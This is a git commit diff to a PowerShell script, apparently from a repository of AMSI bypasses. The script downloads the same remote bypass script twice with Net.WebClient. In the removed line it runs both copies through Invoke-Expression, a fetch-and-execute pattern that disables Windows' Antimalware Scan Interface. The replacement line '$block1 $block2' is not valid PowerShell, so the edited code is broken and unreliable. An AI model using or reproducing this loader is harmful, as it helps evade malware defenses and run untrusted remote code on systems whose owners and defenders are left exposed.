02c3c9130307d005873aae91bbb15c0d04f218a3
74l4r14 <98590947+74l4r14@users.noreply.github.com>
2025-11-11 20:28:42 +0000

    Update DivideAndConquer.ps1

--- DivideAndConquer.ps1
+++ DivideAndConquer.ps1
@@ -3,5 +3,5 @@
 $block1 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc1.ps1")
 $block2 = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/amsiinitfail-dc1.ps1")
 
-Invoke-Expression $block1 $block2
+$block1 $block2
 
